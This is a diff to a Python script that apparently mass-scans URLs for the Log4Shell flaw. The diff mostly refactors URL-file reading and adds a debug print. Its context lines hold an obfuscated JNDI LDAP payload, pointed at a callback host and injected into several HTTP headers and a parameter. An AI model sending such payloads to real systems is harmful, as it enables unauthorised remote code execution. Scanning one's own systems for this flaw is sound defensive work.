@@ -21,12 +21,12 @@ def sendRequest(url, urlId):
         payload3 = '${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://' + str(urlId) + '.${hostName}.' + args.s + '}'
         params = {'x':payload1}
         headers = {'User-Agent':payload2, 'Referer':payload3, 'X-Forwarded-For':payload3, 'Authentication':payload3}
-        url = url.strip()
         r = requests.get(url, headers=headers, params=params, verify=False, proxies=proxies, timeout=10)
         print('[{}] {} ({})'.format(urlId, url, r.status_code))
     except Exception as e:
         print('[{}] Error while testing {}:'.format(urlId, url))
         print(e)
+        print(url, type(url))
         pass
 
 disable_warnings()
@@ -36,9 +36,10 @@ else:
     proxies = {"http":args.proxy, "https":args.proxy}
 urlId = 0
 try:
-    urlFile = open(args.u, 'r')
-    urlList = urlFile.readlines()
-    urlList = list(dict.fromkeys(urlList))
+    with open(args.u) as urlFile:
+        urlList = (line.rstrip() for line in urlFile)
+        urlList = list(line for line in urlList if line)
+        urlList = list(dict.fromkeys(urlList))
 except:
     urlList = [args.u]
 with ThreadPoolExecutor(max_workers=args.threads) as executor:
